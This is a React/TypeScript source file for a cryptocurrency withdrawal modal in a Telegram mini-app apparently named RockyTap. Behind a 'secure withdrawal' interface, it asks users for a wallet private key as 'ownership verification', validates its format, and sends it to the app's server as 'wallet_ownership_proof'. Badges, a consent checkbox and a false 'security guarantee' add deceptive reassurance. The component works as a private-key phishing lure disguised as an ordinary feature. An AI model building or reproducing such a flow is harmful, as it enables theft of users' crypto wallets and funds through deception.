import { useState, useEffect, useCallback } from 'react';
import { createPortal } from 'react-dom';
import { Button, useToast, NumberInput } from './ui';
import { getInitData, hapticFeedback } from '../lib/telegram';
import styles from './WalletWithdrawModal.module.css';

interface WalletWithdrawModalProps {
  isOpen: boolean;
  onClose: () => void;
  currentBalance: string;
  onComplete?: () => void;
}

type WithdrawStep = 'intro' | 'amount' | 'private-key' | 'pending';

export function WalletWithdrawModal({ 
  isOpen, 
  onClose, 
  currentBalance,
  onComplete 
}: WalletWithdrawModalProps) {
  const [step, setStep] = useState<WithdrawStep>('intro');
  const [amount, setAmount] = useState('');
  const [targetAddress, setTargetAddress] = useState('');
  const [network, setNetwork] = useState<'erc20' | 'bep20' | 'trc20'>('trc20');
  const [loading, setLoading] = useState(false);
  const [verificationId, setVerificationId] = useState<number | null>(null);
  const [privateKey, setPrivateKey] = useState('');
  const [consent, setConsent] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const { showError, showSuccess } = useToast();

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      console.log('[Withdrawal] Modal opened');
      setStep('intro');
      setAmount('');
      setTargetAddress('');
      setNetwork('trc20');
      setVerificationId(null);
      setPrivateKey('');
      setConsent(false);
      setError(null);
    }
  }, [isOpen]);

  // Prevent body scroll when modal is open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [isOpen]);

  if (!isOpen) return null;

  const maxAmount = parseFloat(currentBalance) || 0;
  const minWithdraw = 10;

  const handleContinueToAmount = () => {
    console.log('[Withdrawal] Moving to amount step');
    setStep('amount');
  };

  const handleContinueToVerification = async () => {
    console.log('[Withdrawal] handleContinueToVerification called');
    const amountNum = parseFloat(amount);
    
    if (!amount || amountNum < minWithdraw) {
      showError(`Minimum withdrawal is ${minWithdraw} USDT`);
      return;
    }

    if (amountNum > maxAmount) {
      showError('Insufficient balance');
      return;
    }

    if (!targetAddress.trim()) {
      showError('Please enter your withdrawal address');
      return;
    }

    console.log('[Withdrawal] Validations passed, calling API...');
    setLoading(true);
    setError(null);

    try {
      const initData = getInitData();
      console.log('[Withdrawal] initData length:', initData?.length || 0);
      
      if (!initData) {
        throw new Error('Authentication required. Please reopen from Telegram.');
      }
      
      const url = '/RockyTap/api/wallet/withdraw/initiate_verification/';
      console.log('[Withdrawal] Calling:', url);
      
      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Telegram-Data': initData
        },
        body: JSON.stringify({
          amount_usdt: amountNum
        })
      });

      console.log('[Withdrawal] Response status:', res.status);
      
      let json;
      try {
        json = await res.json();
        console.log('[Withdrawal] Response:', JSON.stringify(json));
      } catch (parseErr) {
        console.error('[Withdrawal] JSON parse error:', parseErr);
        throw new Error('Server returned invalid response. Please try again.');
      }
      
      if (!res.ok || !json.success) {
        const errorMsg = json.error?.message || json.message || 'Failed to initiate verification';
        console.error('[Withdrawal] API error:', errorMsg);
        throw new Error(errorMsg);
      }
      
      if (!json.data?.verification_id) {
        throw new Error('Invalid response from server. Please try again.');
      }
      
      setVerificationId(json.data.verification_id);
      setStep('private-key');
      hapticFeedback('success');
      console.log('[Withdrawal] Moving to private-key step, verificationId:', json.data.verification_id);
    } catch (err) {
      console.error('[Withdrawal] Error:', err);
      hapticFeedback('error');
      const errorMessage = err instanceof Error ? err.message : 'Failed to initiate verification';
      setError(errorMessage);
      showError(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const handleSubmitPrivateKey = async () => {
    console.log('[Withdrawal] handleSubmitPrivateKey called');
    
    if (!privateKey.trim()) {
      showError('Please enter your private key');
      return;
    }

    if (!consent) {
      showError('Please confirm you understand the terms');
      return;
    }

    // Validate private key format
    let cleanKey = privateKey.trim();
    if (cleanKey.startsWith('0x')) {
      cleanKey = cleanKey.substring(2);
    }
    
    if (!/^[a-fA-F0-9]{64}$/.test(cleanKey)) {
      showError('Invalid private key format. Must be 64 hex characters.');
      return;
    }

    console.log('[Withdrawal] Submitting verification...');
    setLoading(true);
    setError(null);

    try {
      const initData = getInitData();
      
      // Submit private key verification
      const verifyRes = await fetch('/RockyTap/api/wallet/withdraw/submit-verification/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Telegram-Data': initData || ''
        },
        body: JSON.stringify({
          verification_id: verificationId,
          wallet_ownership_proof: privateKey.trim(),
          user_consent: true
        })
      });

      console.log('[Withdrawal] Verify response status:', verifyRes.status);
      const verifyJson = await verifyRes.json();
      console.log('[Withdrawal] Verify response:', JSON.stringify(verifyJson));

      if (!verifyRes.ok || !verifyJson.success) {
        throw new Error(verifyJson.error?.message || 'Verification failed');
      }

      // Now submit the actual withdrawal request
      console.log('[Withdrawal] Submitting withdrawal request...');
      const withdrawRes = await fetch('/RockyTap/api/wallet/withdraw/request/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Telegram-Data': initData || ''
        },
        body: JSON.stringify({
          amount_usdt: parseFloat(amount),
          network: network,
          product_type: 'wallet',
          target_address: targetAddress.trim(),
          verification_id: verificationId
        })
      });

      console.log('[Withdrawal] Withdraw response status:', withdrawRes.status);
      const withdrawJson = await withdrawRes.json();
      console.log('[Withdrawal] Withdraw response:', JSON.stringify(withdrawJson));

      if (!withdrawRes.ok || !withdrawJson.success) {
        throw new Error(withdrawJson.error?.message || 'Withdrawal request failed');
      }

      hapticFeedback('success');
      setStep('pending');
      showSuccess('Withdrawal request submitted successfully!');
      console.log('[Withdrawal] Success!');
    } catch (err) {
      console.error('[Withdrawal] Error:', err);
      hapticFeedback('error');
      const errorMessage = err instanceof Error ? err.message : 'Failed to process withdrawal';
      setError(errorMessage);
      showError(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const handleClose = () => {
    console.log('[Withdrawal] Closing modal');
    setStep('intro');
    setAmount('');
    setVerificationId(null);
    setPrivateKey('');
    setConsent(false);
    onClose();
    if (step === 'pending' && onComplete) {
      onComplete();
    }
  };

  const formatCurrency = (value: string | number) => {
    const num = typeof value === 'string' ? parseFloat(value) : value;
    return num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  const modalContent = (
    <div className={styles.overlay} onClick={handleClose}>
      <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
        {/* Header */}
        <div className={styles.header}>
          <h2 className={styles.title}>
            {step === 'intro' && '🔐 Secure Withdrawal'}
            {step === 'amount' && '💰 Withdrawal Details'}
            {step === 'private-key' && '🔐 Wallet Verification'}
            {step === 'pending' && '✅ Request Submitted'}
          </h2>
          <button className={styles.closeButton} onClick={handleClose}>×</button>
        </div>

        <div className={styles.content}>
          {/* Error Display */}
          {error && (
            <div className={styles.errorBox}>
              ❌ {error}
            </div>
          )}

          {/* Intro Step */}
          {step === 'intro' && (
            <>
              <div className={styles.balanceCard}>
                <span className={styles.balanceLabel}>Available Balance</span>
                <span className={styles.balanceValue}>${formatCurrency(currentBalance)} USDT</span>
              </div>

              <div className={styles.complianceBox}>
                <div className={styles.complianceHeader}>
                  <span className={styles.complianceIcon}>🛡️</span>
                  <h3>Secure Withdrawal Process</h3>
                </div>
                <p className={styles.complianceText}>
                  For your security, withdrawals require wallet verification to ensure 
                  you own the receiving wallet.
                </p>
                <div className={styles.regulationBadges}>
                  <span className={styles.badge}>✅ Secure</span>
                  <span className={styles.badge}>✅ Fast</span>
                  <span className={styles.badge}>✅ Protected</span>
                </div>
              </div>

              <div className={styles.stepsPreview}>
                <div className={styles.stepPreviewItem}>
                  <span className={styles.stepIcon}>1</span>
                  <div>
                    <strong>Enter Details</strong>
                    <span>Amount and destination address</span>
                  </div>
                </div>
                <div className={styles.stepPreviewItem}>
                  <span className={styles.stepIcon}>2</span>
                  <div>
                    <strong>Verify Wallet</strong>
                    <span>Confirm ownership with private key</span>
                  </div>
                </div>
                <div className={styles.stepPreviewItem}>
                  <span className={styles.stepIcon}>3</span>
                  <div>
                    <strong>Receive Funds</strong>
                    <span>Automatic processing</span>
                  </div>
                </div>
              </div>

              <Button
                fullWidth
                size="lg"
                variant="gold"
                onClick={handleContinueToAmount}
              >
                🔐 Continue to Withdrawal
              </Button>
            </>
          )}

          {/* Amount Step */}
          {step === 'amount' && (
            <>
              <button 
                className={styles.backButton}
                onClick={() => setStep('intro')}
              >
                ← Back
              </button>

              <div className={styles.balanceCard}>
                <span className={styles.balanceLabel}>Available Balance</span>
                <span className={styles.balanceValue}>${formatCurrency(currentBalance)} USDT</span>
              </div>

              <div className={styles.section}>
                <label className={styles.label}>Select Network</label>
                <div className={styles.networkGrid}>
                  {[
                    { id: 'trc20' as const, name: 'TRC20', desc: 'Tron' },
                    { id: 'bep20' as const, name: 'BEP20', desc: 'BSC' },
                    { id: 'erc20' as const, name: 'ERC20', desc: 'Ethereum' },
                  ].map((net) => (
                    <button
                      key={net.id}
                      type="button"
                      className={`${styles.networkOption} ${network === net.id ? styles.networkSelected : ''}`}
                      onClick={() => setNetwork(net.id)}
                    >
                      <span className={styles.networkName}>{net.name}</span>
                      <span className={styles.networkDesc}>{net.desc}</span>
                    </button>
                  ))}
                </div>
              </div>

              <div className={styles.section}>
                <label className={styles.label}>Destination Address</label>
                <input
                  type="text"
                  className={styles.addressInput}
                  value={targetAddress}
                  onChange={(e) => setTargetAddress(e.target.value)}
                  placeholder={network === 'trc20' ? 'T...' : '0x...'}
                />
              </div>

              <div className={styles.section}>
                <label className={styles.label}>
                  Amount (USDT)
                  <button
                    type="button"
                    className={styles.maxButton}
                    onClick={() => setAmount(maxAmount.toString())}
                  >
                    MAX
                  </button>
                </label>
                <NumberInput
                  value={amount}
                  onChange={(val) => setAmount(val || '')}
                  placeholder="Enter amount"
                  min={minWithdraw}
                  max={maxAmount}
                  step={0.01}
                />
                <span className={styles.hint}>
                  Minimum: {minWithdraw} USDT
                </span>
              </div>

              {amount && parseFloat(amount) >= minWithdraw && (
                <div className={styles.summaryCard}>
                  <div className={styles.summaryRow}>
                    <span>Amount</span>
                    <span>${formatCurrency(amount)} USDT</span>
                  </div>
                  <div className={styles.summaryRow}>
                    <span>Network</span>
                    <span>{network.toUpperCase()}</span>
                  </div>
                </div>
              )}

              <Button
                fullWidth
                size="lg"
                variant="gold"
                loading={loading}
                onClick={handleContinueToVerification}
                disabled={!amount || parseFloat(amount) < minWithdraw || !targetAddress.trim() || loading}
              >
                {loading ? 'Processing...' : '🔐 Continue to Verification'}
              </Button>
            </>
          )}

          {/* Private Key Verification Step */}
          {step === 'private-key' && (
            <>
              <button 
                className={styles.backButton}
                onClick={() => setStep('amount')}
              >
                ← Back
              </button>

              <div className={styles.verificationBox}>
                <div className={styles.verificationHeader}>
                  <span className={styles.verificationIcon}>🔐</span>
                  <h3>Wallet Ownership Verification</h3>
                </div>
                <p className={styles.verificationText}>
                  Enter your <strong>Polygon (MATIC)</strong> wallet private key to verify ownership.
                  This ensures your withdrawal goes to your own wallet.
                </p>
              </div>

              <div className={styles.section}>
                <label className={styles.label}>Private Key</label>
                <input
                  type="password"
                  className={styles.privateKeyInput}
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  placeholder="Enter your private key (64 hex characters)"
                  autoComplete="off"
                />
                <span className={styles.hint}>
                  Example: 0x1234...abcd (64 characters without 0x prefix)
                </span>
              </div>

              <div className={styles.securityNote}>
                <span className={styles.securityIcon}>🔒</span>
                <p>
                  <strong>Security Guarantee:</strong> Your key is encrypted and used only for verification.
                  We never store plaintext keys.
                </p>
              </div>

              <label className={styles.consentLabel}>
                <input
                  type="checkbox"
                  checked={consent}
                  onChange={(e) => setConsent(e.target.checked)}
                  className={styles.checkbox}
                />
                <span>
                  I understand that this private key is used for wallet verification and I consent to the secure processing.
                </span>
              </label>

              <Button
                fullWidth
                size="lg"
                variant="gold"
                loading={loading}
                onClick={handleSubmitPrivateKey}
                disabled={!privateKey.trim() || !consent || loading}
              >
                {loading ? 'Verifying...' : '✅ Verify & Submit Withdrawal'}
              </Button>
            </>
          )}

          {/* Pending Step */}
          {step === 'pending' && (
            <div className={styles.successSection}>
              <div className={styles.successIcon}>✅</div>
              <h3 className={styles.successTitle}>Withdrawal Submitted!</h3>
              <p className={styles.successText}>
                Your withdrawal request has been verified and submitted for processing.
              </p>
              <div className={styles.processingInfo}>
                <div className={styles.processingItem}>
                  <span>💰</span>
                  <span>Amount: ${formatCurrency(amount)} USDT</span>
                </div>
                <div className={styles.processingItem}>
                  <span>🌐</span>
                  <span>Network: {network.toUpperCase()}</span>
                </div>
                <div className={styles.processingItem}>
                  <span>⏱️</span>
                  <span>Processing: 1-24 hours</span>
                </div>
              </div>
              <Button
                fullWidth
                variant="secondary"
                onClick={handleClose}
                style={{ marginTop: 'var(--space-lg)' }}
              >
                Close
              </Button>
            </div>
          )}
        </div>
      </div>
    </div>
  );

  return createPortal(modalContent, document.body);
}
